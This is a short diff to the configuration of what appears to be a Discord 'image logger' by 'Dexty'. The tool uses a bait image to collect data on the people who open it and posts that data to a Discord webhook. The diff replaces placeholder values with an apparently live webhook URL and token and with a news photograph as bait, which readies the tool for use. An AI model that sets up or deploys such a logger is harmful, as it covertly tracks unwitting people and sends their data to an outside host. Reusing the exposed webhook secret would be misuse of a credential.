@@ -11,8 +11,8 @@ author = "Dexty"
 
 config = {
 # BASE CONFIG #
-"webhook": "https://discord.com/api/webhooks/your/webhook",
-"image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+"webhook": "https://discord.com/api/webhooks/1443303869043179565/SfEzKbgovb90ETKJk9-pR-RX3zzPtjitBTA6pLUfaGkpVt_mafY0nSEqD5p5L0LOWix_",
+"image": "https://www.bnews.com.br/media/uploads/agosto_2023/whatsapp_image_2023-08-30_at_22.48.59.jpeg", # You can also have a custom image by using a URL argument
 # (E.g. yoursite.com/imagelogger?url=)
 "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
